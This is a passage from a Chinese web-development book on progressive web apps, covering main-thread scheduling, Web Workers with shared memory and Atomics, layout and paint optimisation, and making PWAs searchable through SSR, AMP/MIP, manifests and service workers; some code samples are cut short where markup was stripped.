内，所以保守估计，帧间任务的执行时间最好不要超过 3 ~ 4ms，通常做法如下代码所示。 function scheduleWork (timestamp) { let currentTimestamp while (currentTimestamp - timestamp 0) { performWork(tasks.pop()) currentTimestamp = performance.now() } tasks.length > 0 && requestAnimationFrame(scheduleWork) } requestIdleCallback requestIdleCallback 允许我们将任务安排在浏览器空闲时执行。我们可以将一些不太重要的任务推迟，如发送日志等。requestIdleCallback 的回调函数接收一个参数 deadline，包含 timeRemaining() 方法和 didTimeout 属性。timeRemaining() 返回一个高精度时间戳，表示还剩多少时间执行任务。我们在上文反复提到，应该在 50ms 内处理事件，这对于 requestIdleCallback 来说也是一样的，所以 timeRemaining() 的初始值为 50ms。 function scheduleWork (deadline) { while (deadline.timeRemaining() > 5 && tasks.length > 0) { performWork(tasks.pop()) } tasks.length > 0 && requestIdleCallback(scheduleWork) } requestIdleCallback(scheduleWork) 上述代码与 requestAnimationFrame 中的例子十分相似。假设每个任务都能在 5ms 内完成，那么我们可以设定，当剩余空闲时间大于 5ms 时，继续处理剩余任务，否则就优先确保页面能及时响应用户操作，并将剩余的任务重新调度。 由于我们并不知道浏览器何时才会空闲，因此 requestIdleCallback 回调函数的执行时机是不确定的。但它提供了一个超时机制，能确保在等待超时后执行回调函数，此时 timeRemaining() 为 0，而 didTimeout 为 true。 requestIdleCallback(scheduleWork, {timeout: 2000}) 不过我们最好不要指定超时时间，因为这还是有可能导致页面无法及时响应用户操作。另外，由于不确定的执行时机，我们绝不应该在回调函数里操作 DOM，或进行任何样式变更，而应该放在 requestAnimationFrame 的回调函数中执行。 Web Workers 对于需要长时间执行的任务，另一个解决方案是使用 Web Workers，在第四章介绍 Service Worker 的时候我们已经知道，Web Workers 是独立于主线程的独立工作线程，我们可以将一些耗性能的逻辑放在 worker 线程中进行处理，这样主线程就能继续响应用户操作和渲染页面了。在 Worker 线程中，我们无法访问主线程中的 DOM 或其他数据，仅能通过 postMessage() 与主线程进行数据通信。下面可以看一个最简单的 Web Workers 的示例，假设存在一个主线程入口 main.js，其内容如下： // main.js const worker = new Worker('worker.js') worker.addEventListener('message', event => console.log(event.data)) // 3 worker.postMessage([1, 2]) 上面代码可以看出，通过 new Worker('worker.js') 的方式初始化了一个 worker 线程，和 Service Worker 一样，worker 线程执行的逻辑都会在 worker.js 中实现，下面代码展示的是 worker.js 的内容。 // worker.js self.addEventListener('message', event => { const {data} = event const sum = data[0] + data[1] self.postMessage(sum) }) 注意： 出于安全考虑，Chrome 不支持通过 file 协议加载 Web Worker，如果你想本地直接运行代码，需要在启动 Chrome 时加上参数 --allow-file-access-from-files，或者你可以使用 FireFox 进行调试，FireFox 目前没有此限制。 上述例子中，通过 Worker 线程计算了 1 + 2 的结果。这看起来没什么用，但却揭示了 Web Workers 最基本的用法。接下来我们可以再来看一些稍微复杂一点的例子。 // main.js const canvas = document.querySelector('canvas') const offscreen = canvas.transferControlToOffscreen() const worker = new Worker('worker.js') worker.postMessage({canvas: offscreen}, [offscreen]) // worker.js self.addEventListener('message', event => { const {data: {canvas}} = event const context = canvas.getContext('2d') function render (time) { // ... self.requestAnimationFrame(render) } render() }) 这是一个离屏 canvas 的使用例子。我们把主线程中的 canvas 移动到了 Worker 线程，并在 Worker 线程中进行 canvas 的绘制。前一个例子没有提到的细节是，主线程与 Worker 线程之间，通过 postMessage() 传递数据的方式是“结构化克隆”。这是一种类似深拷贝的算法，用于拷贝结构化数据。但是，直接拷贝显然是低效的，尤其是在传递较大的数据时，性能开销令人难以接受。庆幸的是，实现 Transferable 接口的对象，如 ArrayBuffer、ImageBitmap 和 OffscreenCanvas，都支持移动语义。我们可以在 postMessage() 的第二个参数中声明数据应该移动到 Worker 线程，而不是拷贝。通过 postMessage() 移动后的数据，在原来的线程里就无法读取到了。 根据过往并发编程的经验，我们很容易会思考如何在 Web Workers 的多线程之间共享内存。SharedArrayBuffer 提供了共享内存的机制，在通过 postMessage() 传递数据时，不会进行结构化拷贝，而是在线程间共享相同的内存块。 // main.js const worker = new Worker('worker.js') const length = 8 const size = Int32Array.BYTES_PER_ELEMENT * length const sharedBuffer = new SharedArrayBuffer(size) const sharedArray = new Int32Array(sharedBuffer) worker.postMessage(sharedBuffer) // worker.js self.addEventListener('message', event => { const {data: sharedBuffer} = event const sharedArray = new Int32Array(sharedBuffer) // ... }) 显然，共享内存可能会引发线程安全问题，即代码在多线程环境下，运行结果无法预测，且往往丢失了正确性。一个简单的思路是，确保数据始终只由一个线程来写入，而对于其他线程是只读的，但这样并没有解决本质问题。为了确保线程安全，JavaScript 提供了原子操作类 Atomics ，包含了读取、赋值、加减、位运算等原子操作。 sharedArray[i]++ // 线程不安全 Atomics.add(sharedArray, i, 1) // 线程安全 原子操作表示最小不可分割的操作。上面是一个描述原子操作的经典例子。sharedArray[i]++ 看似是一次递增操作，实际上包含了读取、修改与写入三步，而且写入的值依赖于先前读取的，这会引发线程安全问题，部分线程执行的递增操作可能丢失了。但使用原子操作 Atomics.add() 则是线程安全的，相当于将前者的三步操作合并成了一步，消除了多个线程之间的竞争态。 但并不是使用了原子操作的代码就是线程安全的，我们来看下面的例子。 // main.js const workers = Array.from(Array(4), () => new Worker('worker.js')) const size = 2 * Uint8Array.BYTES_PER_ELEMENT const cache = new SharedArrayBuffer(size) workers.forEach((worker, index) => worker.addEventListener('message', event => { const {data: {num, factorial}} = event let target = 1 for (let i = 2; i Math.ceil(Math.random() * 5)) nums.forEach((num, index) => { workers[index & 3].postMessage({ num, cache }) }) // worker.js self.addEventListener('message', event => { const {data: {num, cache}} = event const lastResult = new Uint8Array(cache) if (Atomics.load(lastResult, 0) === num) { return self.postMessage({ num, factorial: Atomics.load(lastResult, 1) }) } let factorial = 1 for (let i = 2; i 上述代码是一个刻意构造的例子，将 128 个大小为 1~5 的数字分配给四个 Worker 线程计算阶乘，并将最近一次计算的结果缓存在共享内存 cache 里。虽然对 cache 的所有操作均为原子操作，但我们经过简单思考后就能发现，这段代码仍然不是线程安全的。因为我们不能保证两次读取 lastResult 之间，其他线程没有对其进行修改。同样，我们也不能保证能同时写入 lastResult 的两个值。 对于单个共享变量而言，Atomics.compareExchange 提供了一种乐观锁的机制，可以仅在当前值符合预期时才进行写入。但对于多个共享变量的同步，我们通常需要使用互斥锁。注意到 Atomics.wait() 和 Atomics.notify() 的用法类似于 Linux 的 futex，我们可以利用这两个方法，实现一个简单的互斥锁。 class Mutex { constructor (resources, index) { this.resources = resources this.index = index this.locked = false } lock () { if (this.locked) { Atomics.add(this.resources, this.index, 1) return } while (1) { if (Atomics.load(this.resources, this.index) > 0) { while (Atomics.wait(this.resources, this.index, 0) !== 'ok') {} } if (Atomics.compareExchange(this.resources, this.index, 0, 1)) { continue } this.locked = true return } } unlock () { if (!this.locked) { return } if (Atomics.sub(this.resources, this.index, 1) === 1) { this.locked = false } Atomics.notify(this.resources, this.index, 1) } } resources 在多线程中共享，用 resources[index] 表示 index 处被锁定的次数。通过 lock() 请求互斥锁时，会使用 Atomics.wait()\u0010 等待其他线程释放 index 处的锁。类似的，通过 unlock() 释放互斥锁时，会使用 Atomics.notify() 通知其他线程该处的锁已被释放。 降低渲染树计算复杂性 如上文提到的，渲染树由 DOM 和 CSSOM 树合并而成，对于每个 DOM 元素，需要查找与元素匹配的样式规则。从而，在尽量减少 DOM 元素节点的情况下，使用简单的 CSS 选择器是一个很自然的想法。 .last-list-item { /* ... */ } ul.list > li:last-child { /* ... */ } 在上面的例子中，使用一个类作为选择器，要比多种选择器混合使用简单得多。浏览器对于后者，需要花费更多的时间判断选择器与元素是否匹配。只在 CSS 中使用类选择器，并对类名使用 BEM (Block, Element, Modifier) 命名法，是一种组织 CSS 代码的好方式。类名由块、元素、修饰符三部分组成，如上面描述列表中最后一个元素的 BEM 命名法，可以命名为 .list__list-item--last-child。使用 CSS Modules 可以更方便地达到类似的效果。CSS Modules 是一种较为主流的 CSS-in-JS 解决方案，利用 webpack 等构建工具，可以对类选择器生成自定义格式的唯一类名，同样能减少浏览器匹配 CSS 选择器的开销。 减少布局次数 页面布局与元素样式的几何特性相关，对应的 CSS 属性包括盒模型、定位等。修改这些属性会引起一次页面重新布局，又被称作回流。上文提到，浏览器进行一次布局的开销很大，所以我们需要尽可能避免直接修改这些属性，尤其是不应将布局属性用于动画效果，否则会出现明显的掉帧现象。关于如何使用 CSS 编写高性能的动画，会在下一小节里详细讨论。 通过 JavaScript 触发页面布局时，容易造成多种性能问题，其中最常见的是 forced reflow（强制重新布局）。 const box = document.querySelector('.box') let domRect = null function getBoxClientRect () { domRect = box.getBoundingClientRect() } requestAnimationFrame(getBoxClientRect) 我们在下一帧开始前通过 getBoundingClientRect() 获取元素的宽高及视口位置，获取的其实是上一帧已经计算好的布局信息。但如果在这之前又修改了元素的布局属性，那么为了获取当前正确的布局信息，浏览器只能被迫触发一次重新布局。如下面的代码所示： const box = document.querySelector('.box') let domRect = null function getBoxClientRect () { box.style.width = '360px' domRect = box.getBoundingClientRect() // forced reflow } requestAnimationFrame(getBoxClientRect) 但如果我们交换上述写和读的操作，就不会触发重新布局。这是由于浏览器并不会在修改元素布局属性后直接重新布局，而是会将所有修改操作合并，在后续一帧的布局中统一处理。简单来说，始终保持布局属性先读后写，可以有效回避这个性能问题。 我们明白了强制重新布局的原理后，可以再来看一种原理相同但较为隐蔽的性能问题，被为作布局抖动。 const boxes = [...document.querySelectorAll('.box')] boxes.forEach((box) => { const domRect = box.getBoundingClientRect() box.style.width = domRect.width + 10 + 'px' }) 上面的例子试图将所有 .box 元素宽度增加 10px 。看似保持了对布局属性的先读后写，实际上浏览器快速而连续地进行了大量重新布局。这是由于在下一次 forEach() 迭代中，通过 getBoundingClientRect() 获取元素的布局信息时，必须考虑上一次迭代中修改 box.style.width 可能造成的影响。从而浏览器只能在每次迭代中都触发一次重新布局，造成布局抖动的现象。 const boxes = [...document.querySelectorAll('.box')] const domRects = boxes.map(box => box.getBoundingClientRect()) boxes.forEach((box, index) => { box.style.width = domRects[index].width + 10 + 'px' }) 调整元素布局属性的读写顺序，可轻易地解决布局抖动问题。只需确保布局属性先批量读取，再批量写入即可。 优化绘制与合成 类似对布局操作的优化，这一小节我们关注如何减少重绘。上文提到，修改元素几何形态相关的样式属性，才会触发页面重新布局。但对于绘制来说，我们能很直观地想到，修改绝大多数样式属性都会导致页面重绘，这很难避免。仅有的例外是 transform 和 opacity，这是由于它们可以仅由合成器操作图层来实现。另外，合成器运行在单独的线程里，即使浏览器主线程被阻塞，其效果也不会受到影响。所以，transform 和 opacity 非常适合用于实现动画效果，但我们仍需要通过 will-change 为它们创建独立的图层，避免影响其他图层的绘制。 .moving-element { will-change: transform, opacity; } Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter09.html":{"url":"chapter09.html","title":"第9章 PWA 与搜索","keywords":"","body":"PWA 与搜索 PWA 是 Web 的一种形式，搜索仍是它的一大入口。 熟知搜索引擎的开发者都知道，早期的搜索引擎是不支持抓取 SPA(Single Page Application) 的，而 PWA 多是 SPA，在这种情况下，如何让搜索引擎能够更好的收录 PWA 页面是本章要介绍的第一个问题。 SPA 页面依赖于 JavaScript 进行渲染，其内容并不是由服务器端渲染直出的，因此从搜索结果页点击结果跳到 PWA 页面，会经历比较长的时间的一段白屏，如何提升 PWA 页面从搜索过来的体验，是本章要介绍的第二个问题。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter09/1-search-engine-index.html":{"url":"chapter09/1-search-engine-index.html","title":"9.1 搜索引擎收录","keywords":"","body":"搜索引擎收录 搜索引擎作为 Web 的重要的流量入口，是每个 Web App 开发者或运营者需要重点关注的一个方向，而 PWA 作为 Web 的一种形式，自然是需要关注搜索引擎对它的抓取和收录情况。通常 PWA 多数是 SPA，有以下几个原因： SPA 天然具有 App Shell，也就是作为入口的 HTML。 App Shell 和 Service Worker 配套使用非常合适。 页面间切换顺畅，体验良好。 早期的几乎所有的搜索引擎都不支持索引 SPA，这导致 SPA 项目很少应用于依赖流量的用户产品类的 Web App，通常都只是作为内部项目的技术选型，当然这也是早期 Web 用户体验较差的一个原因之一。搜索引擎不能抓取和收录 SPA 有以下几个原因： 搜索引擎只是抓取服务端直出的 HTML页面，并不会去执行页面里包含的 JS 代码，所以无法抓取 SPA 前端渲染后的内容。 路由采用 hash 模式的 SPA 页面没有唯一的 URL，整个 SPA 站点都对应同一个 URL。 好消息是 Google 在 2015-10-14 宣布其搜索引擎可以和现代浏览器一样抓取页面中通过 JavaScript 执行渲染的内容https://webmasters.googleblog.com/2015/10/deprecating-our-ajax-crawling-scheme.html，这样的话，SPA 在搜索引擎中的抓取和收录问题就解决了大半，开发者可以通过 pushState API 的方式来改变 URL，代替 hash 方案，通过前端路由管理的方式让 URL 和 SPA 的页面一一对应，这样就完美的解决了 SPA 在搜索引擎中的抓取和收录问题。 但是事实并非如此，这仅仅是 Google 提出并实践出来了的方案，而现在市场上存在的搜索引擎还有非常多，它们并没有都像 Google 一样完全支持了抓取 SPA。在中国，百度作为最大的中文搜索引擎，从 2018 年才开始逐渐支持对移动端网页的 JavaScript 渲染内容的抓取。甚至直到今天市场还有很多搜索引擎并没有支持在抓取页面的时候运行 JavaScript。因此许多开发者或运营者为了兼顾所有搜索引擎的流量，还是不愿意尝试将整个站点改造为 SPA。 那么，SPA 作为 PWA 的主要存在形态之一，如何让开发者或运营者在这样的搜索引擎环境下去让自己的 Web App 改造成 SPA 甚至是 PWA 呢？通常有如下两种比较好的方案，不仅解决了搜索收录的问题，还能提升用户体验。 SSR（Server Side Rendering）服务端渲染。 结合 AMP/MIP。 当前许多 MVVM 前端开发框架都支持了 SPA/SSR 同构架构模式，如 React/Vue 等。通常采用 SSR 架构的 Web App 能做到第一次请求采用 SSR 模式直接在服务端渲染出内容，以供搜索引擎抓取和收录，第一屏无需在客户端通过执行 JavaScript 渲染内容，后续页面切换操作都是在客户端通过 pushState 的方式切换路由，采用前端渲染方式。这样既保证了搜索引擎的抓取和收录，也保证了 Web App 的良好用户体验。 当前存在的 PWA 有许多也是采用 SPA/SSR 同构架构模式进行开发的。SSR 虽然很好的解决了搜索引擎抓取和收录的问题，但是对于服务器资源的消耗较大，维护成本也相对较高，容易在服务端出现一些意想不到的问题，所以在实际项目中使用时需要多加注意。由于 SSR 可查阅的资料较多，所以 SSR 内容将不在本章过多介绍。 SPA 和 AMP/MIP 的结合，也是一种对搜索引擎友好的方案，在下一小节，将重点介绍这部分的内容。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-04-25 17:03:59 "},"chapter09/2-pwa-and-amp-and-mip.html":{"url":"chapter09/2-pwa-and-amp-and-mip.html","title":"9.2 PWA 与 AMP/MIP","keywords":"","body":"PWA 与 AMP/MIP 本节将会介绍 PWA 如何和 AMP/MIP 进行结合应用，以至于让 PWA 能够再搜索环境下体验变得更好。在看 PWA 如何和 AMP/MIP 结合之前，还是先了解一下什么是 AMP/MIP。 什么是 AMP/MIP AMP（https://www.ampproject.org）和 MIP（https://www.mipengine.org）分别是 Google 和百度推出的网页加速的解决方案，主要面向移动端网页，因为 MIP 和 AMP 都是采用同样原理的解决方案，本章的内容都以介绍 AMP 为主。 AMP 的原理解释起来也很简单，总结起来，包括三个部分：AMP HTML 规范、AMP Cache、AMP JS 运行时。 AMP HTML 规范 AMP 制订了非常严格的 HTML 编写规范，只有严格按照 AMP HTML 规范编写的 HTML 页面并通过 AMP 校验器的校验，才能享受到 Google 搜索结果页给 AMP 页面带来的优质用户体验。 下面的代码展示的是一个简单的 AMP HTML 的例子。 Hello, AMPs /* default css */ body { -webkit-animation: none; -moz-animation: none; -ms-animation: none; animation: none } Welcome to the mobile web 在 AMP HTML 里可以使用很多标准自带的 HTML 标签，如 、 等，但是也有很多标签不能使用，如 、 等，因为这类型的原生的 HTML 标签对页面渲染性能有影响，如 加载的图片不经过 JS 无法 lazyload，对首屏性能有影响。 因此 AMP 采用 W3C 提出的 customElements 标准编写了一个 标签的替代品自定义标签 ，默认支持 lazyload，类似的自定义标签还有很多，最终的目的只有一个：让 AMP 页面的性能最好、体验最佳。 下面是列举了几个比较重要的 AMP HTML 的规范，详细的规范请参照 AMP 的官方文档：https://amp.dev/documentation/guides-and-tutorials/learn/spec/amphtml.html。 MUST 必须要以 开始 HTML 页面。 必须包含雷电标属性或者 amp，如 或 。 必须要包含 和 标签。 在 里必须要有一个 canonical link 标签，指向常规的非 AMP 版本的 HTML 页面，如：。 charset 必须指定为 UTF-8，如 必须包含一个 viewport meta 标签，如：。 引入 AMP 官方指定的 AMP JS 运行时：https://cdn.ampproject.org/v0.js 必须包含 boilerplate 相关样式 MUST NOT 不能在 标签中编写 JavaScript 代码，不能外链 JavaScript 代码，除了 AMP 的代码外。 不能通过 加载外链 style 资源，CSS 必须写在 中，且不超过 50KB。 不允许使用 , , , 等标签。 AMP Cache AMP Cache 是 Google 的一个基于代理的 CDN，几乎所有的 Google 搜索结果页的 AMP 页面的资源都从这个 CDN 分发。AMP Cache 的工作流程非常好理解，流程示意图如图 9-1 所示。 图 9-1 的描述信息基本上可以描述为以下几个步骤： 开发者提供 AMP HTML 页面的 URL 让 Google 搜索引擎爬虫抓取。 当开发者编写的 AMP HTML 页面被 Google 搜索引擎爬虫抓取，首先通过 是否含有 amp 属性判断是否是一个 AMP 页面。 如果判断结果是一个 AMP 页面就会启动 AMP Server 服务。 AMP Server 服务会运行 AMP Validator 来校验当前的 HTML 页面是否完全符合 AMP HTML 的规范，如果校验符合规范，则被认定为标准的 AMP HTML 页面。 AMP Server 会抓取这个 AMP HTML 以及 AMP HTML 依赖的所有静态资源。 AMP Server 将这些静态页面和静态资源全部存储在 AMP Cache，并改写 AMP HTML 的引用静态资源的路径。 当用户在 Google 搜索引擎的搜索结果页点击 AMP 的结果时，Google 会在搜索结果页创建一个 iframe，以异步的方式打开存储在 AMP Cache CDN 的 AMP HTML 页面，而且该页面所有的静态资源就都是从 AMP Cache CDN 加载来的。 也就是说 AMP 通过这种 Cache 存储全部静态资源的方式彻底的保证了加载性能。同时 AMP Cache 支持 HTTP2 协议，并且非常稳定，通过这种集中式的极致性能优化将加载速度提升，能够有效保证页面的稳定性和速度。 AMP JS 运行时 AMP JS 运行时指的是 https://cdn.ampproject.org/v0.js，也经常被称之为 amp.js，amp.js 同样也是部署在 AMP Cache CDN 上的，AMP 封装了一系列的 AMP 自定义标签，这些自定义标签既提供了完善的功能，又充分的规避了性能问题，在用户体验上下足了功夫，而这些 AMP 自定义标签也需要依赖于 amp.js 才能正常执行。 AMP JS 运行时实现了所有 AMP 最佳性能原则（https://www.ampproject.org/learn/about-how)，AMP JS 运行时还提供了资源加载的管理机制，确保页面能够快速渲染，并异步加载所有资源，当然 AMP JS 运行时不仅确保所有的资源能够异步加载，而且还能够在资源加载之前预先计算每个元素的布局，加快首屏展现的速度。当然 AMP JS 运行时提供的功能远比这些复杂的多，AMP 可查阅的资料较多，在本章就不做深入的讲解。 PWA 结合 AMP/MIP 了解了 AMP 和 MIP 的基本原理后，我们已经知道了在移动端 AMP/MIP 是一种行之有效的提升搜索引擎搜索结果落地页性能的方案。但与此同时，我们也看到了 AMP/MIP 的诸多局限性，在规范上限制很多，不能编写 JavaScript 代码，这样对于要实现一个复杂交互的 Web App 来说，无疑是增加了开发和维护成本，甚至可能由于 AMP 自定义标签的功能支持不足以满足业务需求时，会显得束手无策。 因此 Google 也给出了一些建议，他们建议资讯类的 Web App 或交互较少的 Web App 适合用 AMP 来编写，如新闻、博客、相册等应用。而通过前面章节对 PWA 的了解，我们可以知道 PWA 往往比较复杂，能够支撑复杂的交互和复杂的业务逻辑。基于这些背景，我们需要探索出一条路，让用户从搜索结果页到落地页站点都具有比较完美的体验。这就需要考虑将 AMP/MIP 和 PWA 进行结合一下。经过一些实际项目的探索，目前比较合适的方案有两种。 第一种方案是将整个站点都用 AMP 方式来编写，也可以称之为全站 AMP，在 AMP 页面的基础上再增加 Web App Manifest 和 Service Worker 的支持，就能够实现一个 AMP + PWA 模式的站点了。这种方案的好处由于搜索落地页还是 AMP 页面，所以从搜索结果页跳转的落地页体验会非常好，当落地页打开之后，后面再进行交互，由于集成了 Web App Manifest 和 Service Worker，搜索落地页也可以直接具有添加到桌面和离线缓存的功能。但是这种方案局限于 AMP 不能够支持复杂的站点，导致不太适合做复杂交互的 Web App。 第二种方案就是将 AMP/MIP 页面作为中间页面，也可以称之为在 AMP 中预加载 PWA，可以将 AMP 页面的 HTML 中的 标签的 href 指向 PWA 站点 URL，并且类似于 SSR 的方式提供一份 AMP 的页面内容以供搜索引擎抓取，如下代码所示： 在搜索结果页点击 AMP 结果进入搜索落地 AMP 页后，点击 AMP 页面里的链接再跳转到 PWA 相应的页面，这样设计的的好处是在搜索结果页点出的体验非常良好，并且又能实现复杂交互的 PWA。 除此之外，AMP 还提供了 PWA 内嵌 AMP 页面的能力，可以将 AMP 页面作为 PWA 的数据源，详细的可以参考 《Embed & use AMP as a data source》https://www.ampproject.org/docs/integration/pwa-amp/amp-in-pwa，篇幅有限，本章将不会对这种方法进行深入讲解。本章接下来的内容将重点介绍前面提到的两种方案，将会深入的介绍具体做法以及遇到的一些问题。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter09/3-whole-site-amp-and-mip.html":{"url":"chapter09/3-whole-site-amp-and-mip.html","title":"9.3 全站 AMP/MIP","keywords":"","body":"全站 AMP/MIP 全站 AMP/MIP，顾名思义就是指整个站点每个页面都用 AMP/MIP 来编写。由于全站 AMP 和全站 MIP 都会依赖于 AMP/MIP 运行时提供的交互机制，表 9-1 列出了能够通过 AMP/MIP 实现复杂交互的一些技术基础，并列出了 AMP 和 MIP 的一些区别。 AMP MIP 事件处理机制 支持 支持 页面切换过渡动画 不支持 支持 页面间共享数据 不支持 支持 shell 机制 不支持 支持 外部自定义组件 不支持 支持 自定义 JavaScript 不支持 支持 从表 9-1 对比可知，由于 MIP 对全站的支持情况要好于 AMP，所以在本节将会使用 MIP 对全站 AMP/MIP 方案进行讲解。全站 MIP 的实际效果可以看 MIP Project 的官网（https://www.mipengine.org），移动浏览器下效果比较明显。整站 MIP 机制可以参考 MIP 官方文档的可交互设计概述（https://www.mipengine.org/v2/docs/interactive-mip/introduction.html） 注意： 全站 MIP 指的是的开发者自己开发的独立域名的独立 MIP 页面，并不是被 MIP Cache 索引之后的页面，只是 MIP 运行时提供机制能够让 MIP 体验单页化，用户体验会更好。 添加 Web App Manifest 如果要将 MIP 页面改造成 PWA 的话，首先需要给 MIP 添加 Web App Manifest 特性，而 Web App Manifest 在第五章中已经有详细介绍，这里就不再赘述。具体的做法是在每个 MIP 页面的 中添加 manifest.json 文件，如下代码所示。 Hello, MIP 为了保证每个 MIP 页面都能够添加到桌面，每个 MIP 页面都需要添加 manifest.json 文件，manifest.json 的内容示例如下代码所示。 { \"name\": \"MIP-PWA\", \"short_name\": \"MIP-PWA\", \"icons\": [ { \"src\": \"./launcher-icon-1x.png\", \"type\": \"image/png\", \"sizes\": \"48x48\" }, { \"src\": \"./launcher-icon-2x.png\", \"type\": \"image/png\", \"sizes\": \"96x96\" }, { \"src\": \"./launcher-icon-4x.png\", \"type\": \"image/png\", \"sizes\": \"192x192\" } ], \"start_url\": \"/?standalone=1\", \"background_color\": \"#ffffff\", \"display\": \"standalone\", \"theme_color\": \"#1976d2\" } 其中需要注意的是，start_url 需要指定一个固定的入口 URL，当用户将 MIP 页面添加到桌面之后，可以保证用户从桌面入口进入 PWA 之后能够有一个固定的入口。 启用 Service Worker MIP 页面在集成了 Web App Manifest 之后，进而需要集成并启用 Service Worker 才能让站点离线使用，加快首屏展现等。那么如何在 MIP 页面中使用 Service Worker 呢？ 注册 Service Worker 通过第四章对 Service Worker 的介绍，通常注册 Service Worker 只需要在 HTML 页面的 标签中编写一段简短的 JavaScript 代码来完成。但是通过上一节对 AMP/MIP 的介绍，我们知道 AMP/MIP 页面是无法编写 JavaScript 的，那么在这种情况下，如何完成 Service Worker 的注册呢？ 由于 MIP 可以通过 标签来支持编写简单的 JavaScript 代码，虽然有一些限制，但是是可以编写 Service Worker 注册逻辑的，具体代码如下所示： // 注册 Service Worker if ('serviceWorker' in navigator) { navigator.serviceWorker.register('./sw.js') } 注意： MIP 可以通过 标签来支持编写简单的 JavaScript 代码，但是会有一些限制，具体可以参考 组件文档（https://www.mipengine.org/v2/components/extensions/mip-script.html），但是 AMP 并不支持编写自定义 JavaScript 的方式，所以这种方法不适合在 AMP 中使用。 MIP 还提供了一个组件 来帮助 MIP 页面完成 Service Worker 的注册。具体用法很简单，首先只需要在 MIP 页面中引入 组件的 JavaScript CDN 文件地址，如下代码所示： 在引入组件 JavaScript 文件之后，在 MIP 页面中就可以使用 标签在 MIP 页面中进行 Service Worker 的注册，如下代码所示： 在 mip-install-serviceworker 组件里，提供了 src 和 data-iframe-src 两个属性。如果要让 Service Worker 能顺利注册，两个属性都需要填写，因为 MIP 页不仅在搜索结果页下通过 iframe 的方式打开，还可以被直接访问。 如果是直接通过 MIP 页面的独立地址访问，因为 Service Worker 的文件 URL 域和当前 MIP 站点一致，可以直接注册，这个时候就会直接使用到 src 属性提供的 Service Worker 文件 URL，通过组件内部调用 navigator.serviceWorker.register() 方法进行直接注册。 但是 MIP 页不仅能直接访问，还能被缓存在 MIP Cache CDN 上，在搜索结果页通过 iframe 的方式打开，那么用户访问的这个页面的域名就不是站点本身的域名。由于站点不能跨域注册 Service Worker 文件 URL，所以不能无法通过 navigator.serviceWorker.register() 方法直接注册。这种情况下可以通过 iframe 嵌入和站点同一域的一个中间 HTML 页面来解决域名不同的问题，而在这个中间 HTML 页面中就可以注册 Service Worker，提前缓存站点资源，这个中间 HTML 页面的地址就是 data-iframe-src 属性指定的地址，HTML 页面代码可以很简单，如下代码所示： if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/sw.js') } 虽然现代浏览器几乎都已经支持了 Service Worker，但是为了保证极致的体验和兼容性，mip-install-serviceworker 组件还提供了一种机制专门针对那些不支持 Service Worker 的浏览器。可以指定一个特殊的同源 shell 页面，在 MIP 页面中提前加载这个 shell 页面进行 HTTP 缓存。通过 data-no-service-worker-fallback-url-match 属性指定需要跳转到该 shell 页面的 URL 规则，该属性为正则表达式。并且可以通过 data-no-service-worker-fallback-shell-url 指定的 shell 页面的 URL, 需要和 MIP 页面保持同源，当该 shell 页面加载完成之后，有必须通过 hash 参数 redirect 到原页面的逻辑。代码如下所示： link1 link2 link3 在不支持 Service Worker 的浏览器环境下，点击 link1，link2 链接同样可以实现离线缓存的效果，link3 由于不同源的问题，所以缓存不会生效。 当然，AMP 同样也提供了 组件可以进行 Service Worker 注册的工作，用法和 一致。 编写 Service Worker 在 MIP 页面中顺利完成 Service Worker 的注册之后，接下来的工作就是就是编写 Service Worker 文件的逻辑了。根据第四章的介绍，在 Service Worker 中监听 fetch 事件可以拦截在 Service Worker 作用域范围内的所有网络请求，下面代码展示了一个简单的 Service Worker 文件示例： const CACHE_NAME = 'my-mip-pwa-test' self.addEventListener('fetch', event => { event.respondWith( caches.open(CACHE_NAME).then(cache => { return cache.match(event.request).then(response => { let promise = fetch(event.request).then(res => { cache.put(event.request, res.clone()) return res }) // 可以在这里对 response 做进一步的处理 return response || promise }) }) ) }) 通过以上代码就可以完成简易网络请求的缓存功能了，实际上还不是很完善，没有做缓存的更新及清理，也没有预加载的逻辑，在第四章已经对如何开发一个完善的 Service Worker 文件有了详细的介绍，开发者完全可以根据自己的需求来编写 Service Worker 文件。 Copyright ©2019 Baidu BrilliantOpenWeb 本书采用 知识共享署名-非商业性使用 4.0 国际许可协议 进行许可。            该文件修订时间： 2019-05-17 16:26:29 "},"chapter09/4-preload-pwa.html":{"url":"chapter09/4-preload-pwa.html","title":"9.4 AMP/MIP 预加载 PWA","keywords":"","body":"在 AMP/MIP 页面中预加载 PWA 通过本章第二节，我们了解到 AMP/MIP 不适合用实现复杂的 Web App，按照 AMP 官网的介绍，AMP 是“叶子页面”（有具体内容，不是导航类型的页面）理想的解决方案，因为它加载快，体验好，适合做搜索引擎跳出的第一个页面，却由于无法编写 JavaScript，不适合完成复杂的需求。因此第二跳应该从 AMP 跳出到 PWA，但是大部分 PWA 站点由于其重度依赖于 JavaScript，导致首屏较慢，那么这节就来解释一下如何通过在 AMP/MIP 中预加载 PWA 页面来加速 PWA 页面的展现。 接下来先开门见山的介绍一下整个方案的步骤。 将所有的叶子页面都做成 AMP/MIP，通过 canonical 指向 PWA 对应的页面。 在 AMP 页面中嵌入 来提前注册 Service Worker。 Service Worker 在注册和安装的时候把 PWA 页面依赖的文件缓存好，包括 App Shell 依赖的所有资源。 AMP 页面中所有链接都跳到 PWA。 当用户点击 AMP 中的链接，请求会被 Service Worker 拦截，会立即展现 App Shell。 在 AMP/MIP 页面中注册站点的 Service Worker 和上节一样步骤基本一样，首先通过在 MIP 页面中嵌入 来注册 Service Worker。 编写 Service Worker 的逻辑 与上节不同的是，在这种方案里需要对将要跳转的 PWA 页面的 App Shell 等文件进行预缓存，从而提升跳转首屏展现的用户体验，因此代码编写上会有一些区别，下面代码所展示的是一个 AMP/MIP 跳转的 PWA 的 Service Worker 文件的一部分内容，主要是对 App Shell 先进行预缓存。 const CACHE_NAME = 'my-site-precache' const URLS_TO_CACHE = [ '/', '/static/vendor.js', '/static/app.js', '/static/app.css' 